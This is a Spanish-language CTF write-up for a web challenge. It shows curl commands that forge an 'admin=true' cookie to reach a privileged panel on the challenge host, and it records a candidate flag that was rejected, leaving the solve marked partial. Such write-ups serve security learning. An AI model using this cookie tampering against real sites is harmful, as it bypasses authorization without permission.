# Cazadores de biskut

## Reto

- Plataforma: competencia AGETIC / CITC 2026.
- Categoría: Web. Puntos: 61. Autor: MauChuk.
- Objetivo histórico: `http://201.131.45.82:8126/`.
- Estado: **parcial; bandera obtenida con la cookie rechazada según STATE.md**.

> Un ratón se coló en los servidores; hay que descubrir las trampas y usar comida como carnada.

## Resumen

El login crea una cookie `admin=false`. Cambiarla a `admin=true` permite ver un panel privilegiado, pero la cadena mostrada no cerró el reto. El registro `SOLVE.md` afirmaba aceptación y el `STATE.md` documentaba rechazo: se conserva el rechazo como advertencia y no se presenta la cadena como solución definitiva.

## Reconocimiento e hipótesis

La portada enlaza `/login` y `/flag`. El título sugiere galletas/cookies, pero la prueba concreta llega al observar la respuesta del login.

## Resolución parcial paso a paso

1. Enviar credenciales de prueba:

```bash
curl -i -d 'username=test&password=test' http://201.131.45.82:8126/login
```

La respuesta histórica fue `302` hacia `/panel`, con:

```http
Set-Cookie: admin=false; Path=/
```

2. En Caido, llevar la petición a `/panel` a Replay. Cambiar la cabecera a:

```http
Cookie: admin=true
```

Alternativa de terminal documentada por el otro resolutor:

```bash
curl -i -H 'Cookie: admin=true' http://201.131.45.82:8126/panel
```

3. El registro compartido indica que se muestra `CTIC{La5_c00k1e5_n0_s0n_5egura5}`. **Su STATE.md dice que fue rechazada** y que el servicio dejó de responder durante los siguientes intentos.

## Cadena de resolución

`login → Set-Cookie admin=false → modificar cookie → panel accesible → respuesta rechazada → pendiente`

## Flag

**No confirmada.** `CTIC{La5_c00k1e5_n0_s0n_5egura5}` se registra como candidata rechazada, no como bandera final.

## Qué debo recordar para otro CTF

Las cookies son datos que el navegador envía. Si el servidor confía directamente en un valor editable para autorizar acceso, el usuario puede cambiar su rol. Eso demuestra una debilidad de autorización, no la resolución completa de un reto con señuelos.

## Aporte para el arsenal

Mostrar cookies nuevas y diferencias de respuesta al modificar valores. Conservar el rechazo de candidatas para no repetirlas. No asumir que toda cookie firmada garantiza autorización correcta.
